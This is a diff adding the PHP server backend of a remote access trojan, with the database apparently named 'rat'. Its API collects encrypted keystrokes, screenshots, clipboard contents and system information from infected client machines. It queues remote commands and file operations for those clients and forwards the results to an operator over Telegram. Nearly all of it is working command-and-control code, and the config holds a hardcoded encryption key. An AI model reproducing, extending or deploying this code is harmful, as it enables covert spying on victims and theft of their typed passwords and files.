@@ -1,3 +1,470 @@
+Folder Structure:
+├── [FILE] api.php
+├── [FILE] config.php
+├── [FILE] crypto.php
+├── [FILE] database.sql
+├── [FILE] import_sql.php
+├── [FILE] setWebhook.php
+├── [FILE] telegram_handler.php
+└── [FILE] utils.php
+
+
+File Contents:
+----------------------------------------
+File: .\api.php
+----------------------------------------
+<?php
+require_once 'config.php';
+require_once 'crypto.php';
+require_once 'utils.php';
+require_once 'telegram_handler.php';
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+header('Content-Type: application/json; charset=utf-8');
+
+class ApiHandler
+{
+    private $pdo;
+    private $crypto;
+
+    public function __construct()
+    {
+        try {
+            $this->crypto = new Crypto();
+            $this->connect_db();
+            $this->ensure_directories();
+        } catch (Exception $e) {
+            $this->log_error("Constructor Error: " . $e->getMessage());
+            http_response_code(500);
+            echo json_encode(['error' => 'Initialization failed'], JSON_UNESCAPED_UNICODE);
+            exit;
+        }
+    }
+
+    private function connect_db()
+    {
+        try {
+            $this->pdo = new PDO(
+                "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
+                Config::$DB_USER,
+                Config::$DB_PASS,
+                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
+            );
+        } catch (PDOException $e) {
+            $this->log_error("DB Connection Failed: " . $e->getMessage());
+            error_log("Database Error: " . $e->getMessage()); // خطای جدید
+            http_response_code(500);
+            echo json_encode(['error' => 'Database connection failed'], JSON_UNESCAPED_UNICODE);
+            exit;
+        }
+    }
+
+    private function ensure_directories()
+    {
+        foreach ([Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR] as $dir) {
+            if (!is_dir($dir)) {
+                mkdir($dir, 0755, true);
+            }
+        }
+    }
+
+
+    public function handle_request()
+    {
+        $raw = file_get_contents('php://input');
+        $json = json_decode($raw, true);
+
+        if (isset($json['update_id'])) {
+            file_put_contents(Config::$WEBHOOK_LOG, date('c') . " TELEGRAM: $raw\n", FILE_APPEND);
+            try {
+                TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $json);
+            } catch (Exception $e) {
+                $this->log_error("Error in TelegramHandler: " . $e->getMessage());
+                http_response_code(500);
+                echo json_encode(['error' => 'TelegramHandler error'], JSON_UNESCAPED_UNICODE);
+            }
+            return;
+        }
+        $action = $_POST['action'] ?? $_GET['action'] ?? '';
+        $this->log_webhook();
+
+
+        if ($action === 'telegram_webhook') {
+            $update = json_decode(file_get_contents('php://input'), true);
+            TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $update);
+            return;
+        }
+
+        if (!$this->verify_token()) {
+            http_response_code(403);
+            echo json_encode(['error' => 'Invalid token'], JSON_UNESCAPED_UNICODE);
+            return;
+        }
+
+        switch ($action) {
+            case 'upload_data':
+                $this->handle_upload();
+                break;
+            case 'get_commands':
+                $this->handle_get_commands();
+                break;
+            case 'command_response':
+                $this->handle_command_response();
+                break;
+            case 'file_manager':
+                $this->handle_file_manager();
+                break;
+            default:
+                http_response_code(400);
+                echo json_encode(['error' => 'Invalid action'], JSON_UNESCAPED_UNICODE);
+        }
+    }
+
+    private function verify_token()
+    {
+        return isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN;
+    }
+
+    private function log_webhook()
+    {
+        $data = [
+            'time' => date('Y-m-d H:i:s'),
+            'method' => $_SERVER['REQUEST_METHOD'],
+            'post' => $_POST,
+            'get' => $_GET,
+            'input' => file_get_contents('php://input')
+        ];
+        file_put_contents(Config::$WEBHOOK_LOG, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
+    }
+
+    private function handle_upload()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+        $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');
+        $system_info = json_decode($this->crypto->decrypt($_POST['system_info'] ?? ''), true);
+        $screenshot = $_FILES['screenshot'] ?? null;
+
+        $screenshot_path = null;
+        if ($screenshot && $screenshot['error'] === UPLOAD_ERR_OK) {
+            $screenshot_path = Config::$SCREENSHOT_DIR . time() . '_' . $client_id . '.png';
+            move_uploaded_file($screenshot['tmp_name'], $screenshot_path);
+        }
+
+        $this->pdo->prepare("
+            INSERT INTO client_data (client_id, keystrokes, screenshot_path, system_info, received_at)
+            VALUES (?, ?, ?, ?, NOW())
+        ")->execute([$client_id, $keystrokes, $screenshot_path, json_encode($system_info)]);
+
+        $this->pdo->prepare("
+            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
+            VALUES (?, NOW(), ?, ?)
+            ON DUPLICATE KEY UPDATE last_seen = NOW(), ip_address = ?, last_ip = ?
+        ")->execute([$client_id, $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown']);
+
+        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
+    }
+
+    private function handle_get_commands()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+
+        // افزودن بخش به‌روزرسانی وضعیت آنلاین کاربر
+        $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        $this->pdo->prepare("
+            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
+            VALUES (?, NOW(), ?, ?)
+            ON DUPLICATE KEY UPDATE 
+                last_seen = NOW(), 
+                ip_address = VALUES(ip_address),
+                last_ip = VALUES(last_ip)
+        ")->execute([$client_id, $ip_address, $ip_address]);
+
+        // بقیه کد موجود
+        $stmt = $this->pdo->prepare("
+        SELECT id, command, created_at 
+        FROM commands
+        WHERE client_id = ? AND status = 'pending'
+        ORDER BY created_at DESC
+        LIMIT 10
+    ");
+        $stmt->execute([$client_id]);
+        $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);
+
+        $this->pdo->prepare("UPDATE commands SET status = 'sent' WHERE client_id = ? AND status = 'pending'")
+            ->execute([$client_id]);
+
+        echo json_encode([
+            'commands' => array_map(function ($cmd) {
+                return [
+                    'id' => $cmd['id'],
+                    'command' => $cmd['command'],
+                    'type' => 'encrypted_command' // افزودن فیلد type
+                ];
+            }, $commands)
+        ], JSON_UNESCAPED_UNICODE);
+    }
+    private function handle_command_response()
+    {
+        $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
+        $result = json_decode($this->crypto->decrypt($_POST['result'] ?? ''), true);
+
+        $this->pdo->prepare("
+            UPDATE commands SET response = ?, status = 'completed', completed_at = NOW()
+            WHERE id = ?
+        ")->execute([json_encode($result), $command_id]);
+
+        $chat_id = Utils::get_admin_chat_id($this->pdo);
+        if ($chat_id) {
+            TelegramHandler::send_telegram_message(
+                $chat_id,
+                "Command #$command_id executed:\n" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT),
+                ['parse_mode' => 'HTML']
+            );
+        }
+
+        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
+    }
+
+    private function handle_file_manager()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+        $params = json_decode($this->crypto->decrypt($_POST['params'] ?? ''), true);
+        $command = [
+            'type' => 'file_operation',
+            'params' => $params
+        ];
+
+        $stmt = $this->pdo->prepare("
+            INSERT INTO commands (client_id, command, status, created_at)
+            VALUES (?, ?, 'pending', NOW())
+        ");
+        $stmt->execute([$client_id, $this->crypto->encrypt(json_encode($command))]);
+
+        echo json_encode(['status' => 'success', 'command_id' => $this->pdo->lastInsertId()], JSON_UNESCAPED_UNICODE);
+    }
+
+    private function log_error($message)
+    {
+        Utils::log_error($message);
+    }
+}
+
+$api = new ApiHandler();
+$api->handle_request();
+
+
+----------------------------------------
+File: .\config.php
+----------------------------------------
+<?php
+class Config {
+    // Connection Settings
+    public static $SERVER_URL = "https://example.com/api.php"; // آدرس سرور
+    public static $BOT_TOKEN = ""; // توکن بات تلگرام
+    public static $SECRET_TOKEN = "1"; // توکن مخفی برای کلاینت‌ها
+    public static $ENCRYPTION_KEY = "nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo="; // کلید رمزنگاری (base64)
+    public static $ADMIN_CHAT_ID = "";
+    public static $ONLINE_THRESHOLD = 300;
+    public static $WEBHOOK_SECRET = "";
+
+    
+    // Database Settings
+    public static $DB_HOST = "localhost";
+    public static $DB_NAME = "rat";
+    public static $DB_USER = "root";
+    public static $DB_PASS = "";
+    
+    // File Paths
+    public static $SCREENSHOT_DIR = __DIR__ . "/screenshots/";
+    public static $UPLOAD_DIR = __DIR__ . "/uploads/";
+    public static $ERROR_LOG = __DIR__ . "/log/error.log";
+    public static $WEBHOOK_LOG = __DIR__ . "/log/webhook.log";
+    public static $TELEGRAM_LOG = __DIR__ . "/log/telegram_update.log";
+    
+    // Other Settings
+    public static $COMMAND_TIMEOUT = 10; // ثانیه
+    public static $MAX_LOG_SIZE = 1024 * 1024; // 1MB
+}
+?>
+
+----------------------------------------
+File: .\crypto.php
+----------------------------------------
+<?php
+require_once 'config.php';
+
+class Crypto {
+    private $key;
+
+    public function __construct() {
+        $this->key = base64_decode(Config::$ENCRYPTION_KEY);
+        $this->validate_key();
+    }
+
+    private function validate_key() {
+        if (strlen($this->key) !== 32) {
+            throw new Exception("Invalid encryption key length");
+        }
+    }
+
+    public function encrypt($data) {
+        $iv = openssl_random_pseudo_bytes(16);
+        $ciphertext = openssl_encrypt(
+            is_array($data) ? json_encode($data) : $data,
+            'AES-256-CBC',
+            $this->key,
+            OPENSSL_RAW_DATA,
+            $iv
+        );
+        return base64_encode($ciphertext) . '::' . base64_encode($iv);
+    }
+
+    public function decrypt($data) {
+        if (empty($data) || !is_string($data) || !strpos($data, '::')) {
+            throw new Exception("Invalid encrypted data format");
+        }
+
+        list($ciphertext_b64, $iv_b64) = explode('::', $data);
+        $ciphertext = base64_decode($ciphertext_b64);
+        $iv = base64_decode($iv_b64);
+
+        $plaintext = openssl_decrypt(
+            $ciphertext,
+            'AES-256-CBC',
+            $this->key,
+            OPENSSL_RAW_DATA,
+            $iv
+        );
+
+        if ($plaintext === false) {
+            throw new Exception("Decryption failed");
+        }
+
+        return $plaintext;
+    }
+}
+?>
+
+----------------------------------------
+File: .\database.sql
+----------------------------------------
+CREATE TABLE client_data (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    client_id VARCHAR(32) NOT NULL,
+    keystrokes TEXT,
+    screenshot_path VARCHAR(255),
+    system_info JSON,
+    received_at DATETIME NOT NULL,
+    INDEX idx_client_id (client_id)
+);
+
+CREATE TABLE users (
+    client_id VARCHAR(32) PRIMARY KEY,
+    last_seen DATETIME NOT NULL,
+    ip_address VARCHAR(45),
+    last_ip VARCHAR(45)
+);
+
+CREATE TABLE commands (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    client_id VARCHAR(32) NOT NULL,
+    command TEXT NOT NULL,
+    response JSON,
+    status ENUM('pending', 'sent', 'completed') NOT NULL DEFAULT 'pending',
+    created_at DATETIME NOT NULL,
+    completed_at DATETIME,
+    INDEX idx_client_id_status (client_id, status)
+);
+
+CREATE TABLE allowed_users (
+    chat_id BIGINT PRIMARY KEY,
+    selected_client_id VARCHAR(32) NULL
+);
+
+CREATE TABLE user_typelogs (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    chat_id BIGINT NOT NULL,
+    keystrokes TEXT,
+    created_at DATETIME NOT NULL
+);
+
+CREATE TABLE clipboard_logs (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    client_id VARCHAR(32) NOT NULL,
+    content TEXT,
+    created_at DATETIME NOT NULL,
+    INDEX idx_client_id (client_id)
+);
+
+INSERT INTO allowed_users (chat_id) VALUES ('YOUR_ADMIN_CHAT_ID');
+
+----------------------------------------
+File: .\import_sql.php
+----------------------------------------
+<?php
+// import_sql.php
+
+require_once 'config.php';
+
+try {
+    $pdo = new PDO(
+        "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
+        Config::$DB_USER,
+        Config::$DB_PASS,
+        [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+        ]
+    );
+
+    $sqlFile = __DIR__ . '/database.sql';
+
+    if (!file_exists($sqlFile)) {
+        throw new Exception("فایل database.sql پیدا نشد.");
+    }
+
+    $sqlContent = file_get_contents($sqlFile);
+
+    $pdo->exec($sqlContent);
+
+    echo "✅ وارد کردن فایل SQL با موفقیت انجام شد.";
+} catch (PDOException $e) {
+    echo "❌ خطای پایگاه داده: " . $e->getMessage();
+} catch (Exception $e) {
+    echo "❌ خطا: " . $e->getMessage();
+}
+
+
+----------------------------------------
+File: .\setWebhook.php
+----------------------------------------
+<?php
+$token  = 'YOUR_NEW_TOKEN';
+$webhookUrl    = 'https://your.domain.com/api.php';
+$secretToken  = 'YOUR_SECRET_TOKEN';
+
+$params = [
+    'url'                   => $webhookUrl,
+    'secret_token'          => $secretToken,
+    'drop_pending_updates'  => true,
+    // 'certificate'        => new CURLFile('/path/to/your/public.pem'), // اگر گواهی سفارشی دارین
+];
+
+$ch = curl_init("https://api.telegram.org/bot{$token}/setWebhook");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
+echo $response;  // JSON با نتیجه‌ی عملیات
+
+
+----------------------------------------
+File: .\telegram_handler.php
+----------------------------------------
 <?php
 require_once 'config.php';
 require_once 'utils.php';
@@ -601,3 +1068,29 @@ class TelegramHandler
         file_put_contents(Config::$TELEGRAM_LOG, json_encode($log_entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
     }
 }
+
+
+----------------------------------------
+File: .\utils.php
+----------------------------------------
+<?php
+require_once 'config.php';
+
+class Utils {
+    public static function sanitize_input($input) {
+        return htmlspecialchars(strip_tags(trim($input)));
+    }
+
+    public static function get_admin_chat_id($pdo) {
+        return Config::$ADMIN_CHAT_ID;
+    }
+
+    public static function log_error($message) {
+        $log_entry = [
+            'time' => date('Y-m-d H:i:s'),
+            'message' => $message
+        ];
+        file_put_contents(Config::$ERROR_LOG, json_encode($log_entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
+    }
+}
+?>
